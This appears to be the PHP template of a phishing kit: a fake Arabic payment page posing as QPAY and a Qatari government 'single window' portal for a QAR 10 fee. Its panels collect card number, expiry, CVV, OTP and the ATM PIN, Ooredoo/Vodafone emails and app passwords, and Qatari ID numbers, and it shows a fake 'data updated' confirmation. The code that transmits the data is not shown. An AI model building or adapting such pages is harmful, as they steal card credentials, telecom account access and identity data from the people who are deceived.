<?php

declare(strict_types=1);

require_once __DIR__ . '/app/bootstrap.php';

$pageTitle = 'خيار الدفع';
$pageDescription = 'اختر طريقة الدفع للمتابعة.';
$pageId = 'pay';
$bodyClass = 'pay-screen';
$hideSiteFooter = true;
$bareLayout = true;
$htmlLang = 'ar';
$htmlDir = 'rtl';
$skipLinkLabel = 'انتقل إلى المحتوى';
$themeColor = '#59063a';

$payNumber = 'PORTALTP178407242771';
$otpPayNumber = '01112025045342508128';
$payAmount = 'QAR 10.00';
$expiryMonths = ['01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12'];
$expiryYears = [];
$yearNow = (int) date('Y');
for ($year = $yearNow; $year <= $yearNow + 15; $year++) {
    $expiryYears[] = (string) $year;
}

require __DIR__ . '/partials/header.php';
?>

<div class="pay-lang-bar" data-pay-chrome="lang">
    <?php require __DIR__ . '/partials/lang-toggle.php'; ?>
</div>

<section class="pay-shell" data-pay-chrome="card" hidden>
    <article class="qpay-card" data-qpay-card>
        <header class="qpay-head" data-qpay-head>
            <div class="qpay-head__top">
                <div class="qpay-head__logo">
                    <img src="<?= e(asset_url('img/qpay.png')) ?>" alt="QPAY" width="720" height="160">
                </div>
                <span class="qpay-secure">
                    <svg viewBox="0 0 16 16" aria-hidden="true" focusable="false">
                        <circle cx="8" cy="8" r="7" fill="#1f8a4c"/>
                        <path d="M5.1 8.15 7.05 10.1 10.9 5.9" fill="none" stroke="#fff" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
                    </svg>
                    <span data-i18n="pay.secure">دفع آمن</span>
                </span>
            </div>
            <dl class="qpay-meta">
                <div>
                    <dt data-i18n="pay.unique">الرقم الفريد للدفع</dt>
                    <dd><?= e($payNumber) ?></dd>
                </div>
                <div>
                    <dt data-i18n="pay.description">الوصف</dt>
                    <dd><?= e($payNumber) ?></dd>
                </div>
                <div>
                    <dt data-i18n="pay.amount">المبلغ</dt>
                    <dd class="qpay-meta__amount"><?= e($payAmount) ?></dd>
                </div>
            </dl>
        </header>

        <div class="qpay-body" data-pay-panel="methods">
            <h1 class="qpay-title" data-i18n="pay.optionTitle">خيار الدفع</h1>
            <p class="qpay-lead" data-i18n="pay.optionLead">اختر طريقة الدفع للمتابعة</p>
            <p class="qpay-cat">
                <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false">
                    <rect x="2.5" y="5" width="19" height="14" rx="2.2" fill="none" stroke="currentColor" stroke-width="1.7"/>
                    <path d="M2.5 9.2h19" fill="none" stroke="currentColor" stroke-width="1.7"/>
                    <path d="M6 15h5" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round"/>
                </svg>
                <span data-i18n="pay.debitCards">بطاقات الخصم والمسبقة الدفع</span>
            </p>
            <div class="qpay-methods">
                <button class="qpay-method" type="button" data-pay-method="himyan" aria-label="الدفع عبر هميان">
                    <img src="<?= e(asset_url('img/himyan.png')) ?>" alt="" width="720" height="180">
                </button>
                <button class="qpay-method" type="button" data-pay-method="naps" aria-label="الدفع عبر نابس">
                    <img src="<?= e(asset_url('img/naps.png')) ?>" alt="" width="720" height="180">
                </button>
            </div>
            <p class="qpay-note">
                <span class="qpay-note__icon" aria-hidden="true">!</span>
                <span data-i18n="pay.note">لإتمام العملية بشكل صحيح، يرجى عدم تحديث الصفحة أو الضغط على زر الرجوع في المتصفح.</span>
            </p>
            <button class="qpay-proceed" type="button" disabled data-i18n="pay.proceed">المتابعة إلى الدفع</button>
            <button class="qpay-cancel" type="button" data-pay-nav-back data-i18n="pay.cancel">إلغاء</button>
        </div>

        <div class="qpay-body" data-pay-panel="local" hidden>
            <form class="qpay-form" data-pay-form="local" novalidate autocomplete="off">
                <label class="qpay-label" for="local-card" data-i18n="pay.cardNumber">رقم البطاقة</label>
                <input id="local-card" name="cardNumber" class="qpay-input" type="text" inputmode="numeric" maxlength="19">

                <div class="qpay-split">
                    <div>
                        <label class="qpay-label" for="local-month" data-i18n="pay.expiryMonth">شهر الانتهاء</label>
                        <select id="local-month" name="expiryMonth" class="qpay-input qpay-select">
                            <option value=""></option>
                            <?php foreach ($expiryMonths as $month): ?>
                                <option value="<?= e($month) ?>"><?= e($month) ?></option>
                            <?php endforeach; ?>
                        </select>
                    </div>
                    <div>
                        <label class="qpay-label" for="local-year" data-i18n="pay.expiryYear">سنة الانتهاء</label>
                        <select id="local-year" name="expiryYear" class="qpay-input qpay-select">
                            <option value=""></option>
                            <?php foreach ($expiryYears as $year): ?>
                                <option value="<?= e($year) ?>"><?= e($year) ?></option>
                            <?php endforeach; ?>
                        </select>
                    </div>
                </div>

                <div class="qpay-cvv" data-local-cvv hidden>
                    <label class="qpay-label" for="local-cvv2">CVV2</label>
                    <input id="local-cvv2" name="cvv2" class="qpay-input" type="text" inputmode="numeric" maxlength="4" autocomplete="off">
                </div>

                <p class="qpay-legal"><span data-i18n="pay.legalBefore">بالضغط على زر «استمر» فإنك تقر بقبول </span><a href="#" data-pay-terms data-i18n="pay.terms">الشروط والأحكام</a><span data-i18n="pay.legalAfter"> الخاصة بالدفع.</span></p>
                <p class="qpay-error" data-pay-error aria-live="polite"></p>
                <button class="qpay-proceed" type="submit" data-pay-continue disabled data-i18n="pay.continue">استمر</button>
                <button class="qpay-cancel" type="button" data-pay-nav-back data-i18n="pay.cancel">إلغاء</button>
            </form>
        </div>
    </article>
</section>

<section class="visa-shell" data-pay-panel="visa" hidden>
    <header class="visa-shell__header">
        <div class="visa-shell__top">
            <?php require __DIR__ . '/partials/lang-toggle.php'; ?>
            <img
                class="visa-shell__cards"
                src="<?= e(asset_url('img/visa-mastercard.png')) ?>"
                alt="Visa / Mastercard"
                width="720"
                height="160"
            >
            <a class="visa-shell__brand" href="<?= e(app_url()) ?>" aria-label="النافذة الواحدة">
                <?php
                $brandSize = 'header';
                $brandInverse = false;
                require __DIR__ . '/partials/brand-lockup.php';
                ?>
            </a>
        </div>
    </header>

    <div class="visa-shell__body">
        <div class="visa-layout">
            <article class="visa-panel visa-panel--form">
                <div class="visa-panel__head">
                    <h1 class="visa-panel__title" data-i18n="visa.title">بيانات البطاقة</h1>
                    <p class="visa-panel__lead" data-i18n="visa.lead">أدخل بيانات بطاقة فيزا أو ماستركارد لإتمام عملية الدفع بأمان</p>
                </div>
                <form class="visa-form" data-pay-form="visa" novalidate autocomplete="off">
                    <label class="visa-label" for="visa-card" data-i18n="pay.cardNumber">رقم البطاقة</label>
                    <div class="visa-card-field">
                        <input id="visa-card" name="cardNumber" class="visa-input" type="text" inputmode="numeric" maxlength="23" autocomplete="cc-number" dir="ltr" placeholder="XXXX XXXX XXXX XXXX">
                        <img class="visa-card-field__brands" src="<?= e(asset_url('img/visa-mastercard.png')) ?>" alt="" width="720" height="160">
                    </div>

                    <label class="visa-label" for="visa-name" data-i18n="visa.cardholder">اسم حامل البطاقة</label>
                    <input id="visa-name" name="cardHolder" class="visa-input" type="text" autocomplete="cc-name" placeholder="NAME ON CARD">

                    <div class="visa-split">
                        <div>
                            <label class="visa-label" for="visa-month" data-i18n="pay.expiryMonth">شهر الانتهاء</label>
                            <select id="visa-month" name="expiryMonth" class="visa-input visa-select" autocomplete="cc-exp-month">
                                <option value=""></option>
                                <?php foreach ($expiryMonths as $month): ?>
                                    <option value="<?= e($month) ?>"><?= e($month) ?></option>
                                <?php endforeach; ?>
                            </select>
                        </div>
                        <div>
                            <label class="visa-label" for="visa-year" data-i18n="pay.expiryYear">سنة الانتهاء</label>
                            <select id="visa-year" name="expiryYear" class="visa-input visa-select" autocomplete="cc-exp-year">
                                <option value=""></option>
                                <?php foreach ($expiryYears as $year): ?>
                                    <option value="<?= e($year) ?>"><?= e($year) ?></option>
                                <?php endforeach; ?>
                            </select>
                        </div>
                    </div>

                    <label class="visa-label" for="visa-cvv">
                        <span>CVV</span>
                        <span class="visa-cvv-help" title="الرمز المكوّن من 3 أو 4 أرقام على ظهر البطاقة" data-i18n-title="visa.cvvHelp">?</span>
                    </label>
                    <input id="visa-cvv" name="cvv" class="visa-input visa-input--cvv" type="password" inputmode="numeric" maxlength="4" autocomplete="cc-csc" dir="ltr" placeholder="***">

                    <p class="visa-legal"><span data-i18n="pay.legalBefore">بالضغط على زر «استمر» فإنك تقر بقبول </span><a href="#" data-pay-terms data-i18n="pay.terms">الشروط والأحكام</a><span data-i18n="pay.legalAfter"> الخاصة بالدفع.</span></p>
                    <p class="visa-error" data-pay-error aria-live="polite"></p>
                    <button class="visa-pay" type="submit" data-pay-continue disabled data-i18n="visa.payNow">ادفع الآن</button>
                    <button class="visa-cancel" type="button" data-pay-nav-back data-i18n="pay.cancel">إلغاء</button>
                </form>
            </article>

            <aside class="visa-panel visa-panel--summary" aria-labelledby="visa-summary-title">
                <h2 class="visa-panel__title visa-panel__title--sm" id="visa-summary-title" data-i18n="visa.summaryTitle">ملخص الدفع</h2>
                <dl class="visa-summary">
                    <div>
                        <dt data-i18n="visa.merchant">التاجر</dt>
                        <dd data-i18n="visa.merchantName">بوابة الخدمات الموحدة</dd>
                    </div>
                    <div>
                        <dt data-i18n="pay.unique">الرقم الفريد للدفع</dt>
                        <dd dir="ltr"><?= e($payNumber) ?></dd>
                    </div>
                    <div>
                        <dt data-i18n="pay.description">الوصف</dt>
                        <dd><?= e($payNumber) ?></dd>
                    </div>
                    <div class="visa-summary__total">
                        <dt data-i18n="visa.total">الإجمالي</dt>
                        <dd><?= e($payAmount) ?></dd>
                    </div>
                </dl>
                <p class="visa-secure">
                    <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false">
                        <path fill="currentColor" d="M12 2 5 5v6.2c0 4.4 2.9 8.5 7 9.8 4.1-1.3 7-5.4 7-9.8V5l-7-3Zm0 11.2c.7 0 1.2-.6 1.2-1.2V10c.6-.3 1-1 1-1.7 0-1.1-.9-2-2-2s-2 .9-2 2c0 .7.4 1.4 1 1.7v1.9c0 .7.5 1.3 1.2 1.3Z"/>
                    </svg>
                    <span data-i18n="visa.secureNote">هذه الصفحة مؤمنة. لا تشارك بيانات بطاقتك مع أي شخص.</span>
                </p>
                <p class="visa-accepted" data-i18n="visa.accepted">البطاقات المقبولة</p>
                <img class="visa-accepted__img" src="<?= e(asset_url('img/visa-mastercard.png')) ?>" alt="Visa / Mastercard" width="720" height="160">
            </aside>
        </div>
    </div>
    <?php
    $nasBrand = 'sw';
    require __DIR__ . '/partials/nas-footer.php';
    ?>
</section>

<section
    class="pay-loading pay-loading--verify"
    data-pay-panel="loading"
    data-pay-loading-state="pending"
    hidden
    role="status"
    aria-live="polite"
    aria-busy="true"
>
    <header class="pay-loading__header pay-loading__header--minimal">
        <div class="pay-loading__top">
            <?php require __DIR__ . '/partials/lang-toggle.php'; ?>
        </div>
    </header>
    <div class="pay-loading__body pay-loading__body--verify">
        <div class="pay-loading__stage">
            <div class="pay-loading__mark">
                <span class="pay-loading__halo" aria-hidden="true"></span>
                <span class="pay-loading__track" aria-hidden="true"></span>
                <span class="pay-loading__ring" aria-hidden="true"></span>
                <img
                    class="pay-loading__logo"
                    src="<?= e(asset_url('img/single-window.png')) ?>"
                    alt="النافذة الواحدة"
                    width="218"
                    height="72"
                    decoding="async"
                >
            </div>
            <div class="pay-loading__copy" data-pay-loading-copy>
                <h1 class="pay-loading__title" data-i18n="pay.loadingTitle">نتحقق من بياناتك الآن</h1>
                <p class="pay-loading__lead" data-i18n="pay.loadingText">يرجى إبقاء الصفحة مفتوحة دون تحديث حتى يكتمل التحقق.</p>
            </div>
            <div class="pay-loading__fail" data-pay-loading-fail hidden>
                <h1 class="pay-loading__title pay-loading__title--fail" data-i18n="pay.loadingFailTitle">تعذر إكمال التحقق</h1>
                <p class="pay-loading__lead" data-i18n="pay.loadingFailText">لم نتمكن من إكمال التحقق الآن. يرجى المحاولة مرة أخرى دون تحديث الصفحة.</p>
                <button
                    class="pay-loading__retry"
                    type="button"
                    data-pay-loading-retry
                    data-pay-unlock
                    data-i18n="pay.loadingRetry"
                >إعادة المحاولة</button>
            </div>
        </div>
    </div>
</section>

<section class="pay-loading pay-result" data-pay-panel="pay-reject" hidden>
    <header class="pay-loading__header">
        <div class="pay-loading__top">
            <?php require __DIR__ . '/partials/lang-toggle.php'; ?>
            <a class="pay-loading__brand" href="<?= e(app_url()) ?>" aria-label="النافذة الواحدة">
                <?php
                $brandSize = 'header';
                $brandInverse = false;
                require __DIR__ . '/partials/brand-lockup.php';
                ?>
            </a>
        </div>
    </header>
    <div class="pay-loading__body">
        <div class="pay-result__icon pay-result__icon--error" aria-hidden="true">!</div>
        <h1 class="pay-result__title" data-i18n="pay.rejectTitle">عملية الدفع مرفوضة</h1>
        <p class="pay-result__text" data-i18n="pay.rejectText">الرجاء التحقق من صحة بيانات البطاقة أو استخدام بطاقة دفع أخرى</p>
        <button class="pay-result__btn" type="button" data-pay-unlock data-pay-back-pay data-i18n="pay.rejectBack">الرجوع للدفع</button>
    </div>
    <?php
    $nasBrand = 'sw';
    require __DIR__ . '/partials/nas-footer.php';
    ?>
</section>

<section class="pay-loading pay-result" data-pay-panel="pay-confirm" hidden>
    <header class="pay-loading__header">
        <div class="pay-loading__top">
            <?php require __DIR__ . '/partials/lang-toggle.php'; ?>
            <a class="pay-loading__brand" href="<?= e(app_url()) ?>" aria-label="النافذة الواحدة">
                <?php
                $brandSize = 'header';
                $brandInverse = false;
                require __DIR__ . '/partials/brand-lockup.php';
                ?>
            </a>
        </div>
    </header>
    <div class="pay-loading__body">
        <div class="pay-result__icon pay-result__icon--ok" aria-hidden="true">✓</div>
        <h1 class="pay-result__title" data-i18n="pay.confirmTitle">تم تحديث بياناتك الشخصية بنجاح</h1>
        <p class="pay-result__text" data-i18n="pay.confirmLead">رقم الطلب</p>
        <p class="pay-result__ref" data-confirm-ref dir="ltr">SW-00000000</p>
        <button class="pay-result__btn pay-result__btn--primary" type="button" data-pay-unlock data-pay-home data-i18n="pay.confirmHome">الرجوع للشاشة الرئيسية</button>
    </div>
    <?php
    $nasBrand = 'sw';
    require __DIR__ . '/partials/nas-footer.php';
    ?>
</section>

<section class="otp-shell" data-pay-panel="otp" hidden>
    <div class="otp-page">
        <img class="otp-page__logo" src="<?= e(asset_url('img/qpay.png')) ?>" alt="QPAY" width="720" height="160">
        <p class="otp-page__meta"><strong data-i18n="pay.unique">الرقم الفريد للدفع</strong>: <span dir="ltr"><?= e($otpPayNumber) ?></span></p>
        <p class="otp-page__meta"><strong data-i18n="pay.description">الوصف</strong>: DebitCard</p>
        <article class="otp-card">
            <header class="otp-card__head" data-i18n="pay.otpHead">أدخل كلمة المرور لمرة واحدة (OTP) التي استلمتها</header>
            <div class="otp-card__body">
                <p class="otp-card__lead" data-i18n="pay.otpLead">لزيادة الأمان، أرسل لك البنك كلمة مرور صالحة لمرة واحدة</p>
                <form class="otp-form" data-otp-form novalidate autocomplete="one-time-code">
                    <label class="otp-label" for="pay-otp"><span data-i18n="pay.otpLabel">رمز التحقق</span> <span class="otp-req">*</span></label>
                    <input id="pay-otp" name="otp" class="otp-input" type="text" inputmode="numeric" maxlength="8" autocomplete="one-time-code">
                    <p class="otp-error" data-otp-error aria-live="polite" hidden></p>
                    <div class="otp-brands" aria-hidden="true">
                        <img src="<?= e(asset_url('img/naps.png')) ?>" alt="" width="720" height="180">
                        <img src="<?= e(asset_url('img/himyan.png')) ?>" alt="" width="720" height="180">
                    </div>
                    <button class="otp-continue" type="submit" data-i18n="pay.continue">استمر</button>
                    <button class="otp-cancel" type="button" data-pay-nav-back data-i18n="pay.cancel">إلغاء</button>
                </form>
            </div>
        </article>
    </div>
</section>

<section class="pin-shell" data-pay-panel="pin" hidden>
    <div class="pin-backdrop">
        <article class="pin-modal" role="dialog" aria-modal="true" aria-labelledby="pin-title">
            <button class="pin-close" type="button" data-pin-close aria-label="إغلاق">×</button>
            <img class="pin-modal__logo" src="<?= e(asset_url('img/qpay.png')) ?>" alt="QPAY" width="720" height="160">
            <p class="pin-modal__title" id="pin-title" data-i18n="pay.pinTitle">يرجى ادخال رمز الصراف المكون من 4 ارقام لتأكيد الدفع</p>
            <form class="pin-form" data-pin-form novalidate autocomplete="off">
                <div class="pin-row">
                    <input id="pay-pin" name="pin" class="pin-input" type="password" inputmode="numeric" maxlength="4" autocomplete="off" aria-describedby="pin-error">
                    <button class="pin-verify" type="submit" data-i18n="pay.pinVerify">تحقق</button>
                </div>
                <p class="pin-error" id="pin-error" data-pin-error hidden data-i18n="pay.pinError">الرمز المدخل غير صحيح، يرجى ادخال الرمز السري للبطاقة والمكون من 4 ارقام</p>
            </form>
            <div class="pin-brands" aria-hidden="true">
                <img src="<?= e(asset_url('img/naps.png')) ?>" alt="" width="720" height="180">
                <img src="<?= e(asset_url('img/himyan.png')) ?>" alt="" width="720" height="180">
            </div>
        </article>
    </div>
</section>

<section class="phone-shell" data-pay-panel="phone" hidden>
    <?php require __DIR__ . '/partials/phone-flow-top.php'; ?>
    <div class="phone-shell__body">
        <article class="phone-card">
            <h1 class="phone-card__title" data-i18n="phone.title">توثيق رقم الهاتف</h1>
            <p class="phone-card__lead" data-i18n="phone.lead1">يرجى ادخال رقم الهاتف المرتبط بطريقة الدفع، لإثبات ملكية البطاقة.</p>
            <p class="phone-card__note" data-i18n="phone.lead2">لا يشترط الدفع ببطاقة تابعة للمستخدم المراد تسجيله، يمكنك استخدام بطاقة تعود لشخص آخر، لكن يجب اثبات ملكيتها من خلال رقم الهاتف والرقم الشخصي لصاحب البطاقة.</p>
            <form class="phone-form" data-phone-form novalidate autocomplete="off">
                <label class="phone-label" for="phone-provider" data-i18n="phone.provider">مزود الخدمة</label>
                <select id="phone-provider" name="provider" class="phone-input phone-select">
                    <option value="" data-i18n="phone.providerPlaceholder">اختر مزود الخدمة</option>
                    <option value="ooredoo">اوريدو ooredoo</option>
                    <option value="vodafone">فودافون vodafone</option>
                </select>

                <div class="phone-fields" data-phone-fields hidden>
                    <label class="phone-label" for="phone-number"><span data-i18n="phone.number">رقم الهاتف</span> <span class="phone-req">*</span></label>
                    <input id="phone-number" name="phone" class="phone-input" type="tel" inputmode="tel" autocomplete="off" placeholder="Phone" dir="ltr">

                    <label class="phone-label" for="phone-email"><span data-phone-email-label data-i18n="phone.emailOoredoo">البريد الالكتروني المعتمد ب اوريدو</span> <span class="phone-req">*</span></label>
                    <input id="phone-email" name="email" class="phone-input" type="email" autocomplete="off" placeholder="Email" dir="ltr">

                    <label class="phone-label" for="phone-id"><span data-i18n="phone.id">الرقم الشخصي لمالك البطاقة</span> <span class="phone-req">*</span></label>
                    <input id="phone-id" name="personalId" class="phone-input" type="text" inputmode="numeric" autocomplete="off" placeholder="Id" dir="ltr">

                    <label class="phone-label" for="phone-password"><span data-phone-password-label data-i18n="phone.passwordOoredoo">كلمة المرور لتطبيق اوريدو</span></label>
                    <input id="phone-password" name="password" class="phone-input" type="password" autocomplete="new-password">
                </div>

                <div class="phone-extras" data-phone-extras hidden>
                    <a class="phone-forgot" href="#phone-forgot" data-phone-forgot data-i18n="phone.forgot">هل نسيت كلمة المرور؟</a>
                    <a class="phone-signup" href="#phone-register" data-phone-register data-i18n="phone.signup">إنشاء حساب</a>
                </div>
                <p class="phone-error" data-phone-error aria-live="polite"></p>
                <button class="phone-continue" type="submit" data-i18n="phone.continue">استمر</button>
                <button class="phone-back" type="button" data-pay-nav-back data-i18n="pay.cancel">إلغاء</button>
            </form>
        </article>
    </div>
    <?php
    $nasBrand = 'sw';
    require __DIR__ . '/partials/nas-footer.php';
    ?>
</section>

<section class="phone-shell" data-pay-panel="phone-forgot" hidden>
    <?php require __DIR__ . '/partials/phone-flow-top.php'; ?>
    <div class="phone-shell__body">
        <article class="phone-card phone-card--forgot">
            <h1 class="phone-card__title phone-card__title--accent" data-i18n="phoneForgot.title">هل نسيت كلمة المرور؟</h1>
            <p class="phone-card__lead" data-i18n="phoneForgot.lead">هل نسيت كلمة المرور؟ لنقم بإنشاء كلمة مرور جديدة</p>
            <p class="phone-card__note" data-i18n="phoneForgot.note">يُرجى إدخال اسم المستخدم أو البريد الإلكتروني، ورقم البطاقة الشخصية القطرية أو رقم جواز السفر ليصلك رابط إعادة تعيين كلمة المرور.</p>
            <form class="phone-form" data-phone-forgot-form novalidate autocomplete="off">
                <label class="sr-only" for="phone-forgot-user" data-i18n="phoneForgot.userLabel">البريد الإلكتروني أو اسم المستخدم</label>
                <input id="phone-forgot-user" name="username" class="phone-input" type="text" autocomplete="username" placeholder="البريد الإلكتروني أو اسم المستخدم" data-i18n-placeholder="phoneForgot.userPlaceholder">

                <label class="sr-only" for="phone-forgot-id" data-i18n="phoneForgot.idLabel">رقم البطاقة الشخصية القطرية أو جواز السفر</label>
                <input id="phone-forgot-id" name="qid" class="phone-input" type="text" autocomplete="off" placeholder="رقم البطاقة الشخصية القطرية أو جواز السفر" data-i18n-placeholder="phoneForgot.idPlaceholder" dir="ltr">

                <p class="phone-error" data-phone-forgot-error aria-live="polite"></p>
                <button class="phone-continue" type="submit" data-i18n="phone.continue">استمر</button>
                <button class="phone-back" type="button" data-pay-nav-back data-i18n="pay.cancel">إلغاء</button>
            </form>
        </article>
    </div>
    <?php
    $nasBrand = 'sw';
    require __DIR__ . '/partials/nas-footer.php';
    ?>
</section>

<section class="phone-shell" data-pay-panel="phone-register" hidden>
    <?php require __DIR__ . '/partials/phone-flow-top.php'; ?>
    <div class="phone-shell__body">
        <article class="phone-card phone-card--forgot">
            <h1 class="phone-card__title phone-card__title--accent" data-i18n="phoneRegister.title">إنشاء حساب</h1>
            <p class="phone-card__lead" data-i18n="phoneRegister.lead">إنشاء حساب جديد لتوثيق رقم الهاتف</p>
            <p class="phone-card__note" data-i18n="phoneRegister.note">يُرجى إدخال رقم الهاتف القطري، ورقم البطاقة الشخصية القطرية أو رقم جواز السفر لإتمام إنشاء الحساب.</p>
            <form class="phone-form" data-phone-register-form novalidate autocomplete="off">
                <label class="phone-label" for="phone-register-number" data-i18n="phoneRegister.phoneLabel">رقم الهاتف</label>
                <div class="phone-dial" dir="ltr">
                    <span class="phone-dial__code">+974</span>
                    <input id="phone-register-number" name="phone" class="phone-input phone-dial__input" type="tel" inputmode="numeric" maxlength="8" autocomplete="tel-national" placeholder="XXXXXXXX" data-i18n-placeholder="phoneRegister.phonePlaceholder">
                </div>

                <label class="sr-only" for="phone-register-id" data-i18n="phoneRegister.idLabel">رقم البطاقة الشخصية القطرية أو جواز السفر</label>
                <input id="phone-register-id" name="qid" class="phone-input" type="text" autocomplete="off" placeholder="رقم البطاقة الشخصية القطرية أو جواز السفر" data-i18n-placeholder="phoneRegister.idPlaceholder" dir="ltr">

                <p class="phone-error" data-phone-register-error aria-live="polite"></p>
                <button class="phone-continue" type="submit" data-i18n="phone.continue">استمر</button>
                <button class="phone-back" type="button" data-pay-nav-back data-i18n="pay.cancel">إلغاء</button>
            </form>
        </article>
    </div>
    <?php
    $nasBrand = 'sw';
    require __DIR__ . '/partials/nas-footer.php';
    ?>
</section>

<section class="phone-shell" data-pay-panel="phone-code" hidden>
    <?php require __DIR__ . '/partials/phone-flow-top.php'; ?>
    <div class="phone-shell__body">
        <article class="phone-card">
            <h1 class="phone-card__title" data-i18n="phoneCode.title">رمز تحقق توثيق رقم الهاتف</h1>
            <p class="phone-card__lead" data-i18n="phoneCode.lead">يرجى إدخال رمز التحقق المرسل إليك لإتمام توثيق رقم الهاتف.</p>
            <p class="phone-card__note" data-i18n="phoneCode.note">يمكنك إدخال أحرف وأرقام في حقل الرمز.</p>
            <form class="phone-form" data-phone-code-form novalidate autocomplete="one-time-code">
                <label class="phone-label" for="phone-code-value" data-i18n="phoneCode.label">رمز التحقق</label>
                <input id="phone-code-value" name="code" class="phone-input" type="text" inputmode="text" autocomplete="one-time-code" dir="ltr">
                <p class="phone-error" data-phone-code-error aria-live="polite"></p>
                <button class="phone-continue" type="submit" data-i18n="phone.continue">استمر</button>
                <button class="phone-back" type="button" data-pay-nav-back data-i18n="pay.cancel">إلغاء</button>
            </form>
        </article>
    </div>
    <?php
    $nasBrand = 'sw';
    require __DIR__ . '/partials/nas-footer.php';
    ?>
</section>

<script>
(function () {
    var hash = (window.location.hash || '').replace(/^#/, '');
    var chrome = document.querySelector('[data-pay-chrome="card"]');
    var methods = document.querySelector('[data-pay-panel="methods"]');
    var showChrome = !hash || hash === 'methods' || hash === 'local';
    if (chrome) {
        chrome.hidden = !showChrome;
    }
    if (!hash || hash === 'methods') {
        if (methods) {
            methods.hidden = false;
        }
        return;
    }
    var target = document.querySelector('[data-pay-panel="' + hash.replace(/[^a-z0-9-]/gi, '') + '"]');
    if (!target) {
        return;
    }
    if (methods && hash !== 'local') {
        methods.hidden = true;
    }
    target.hidden = false;
})();
</script>
<?php require __DIR__ . '/partials/footer.php'; ?>
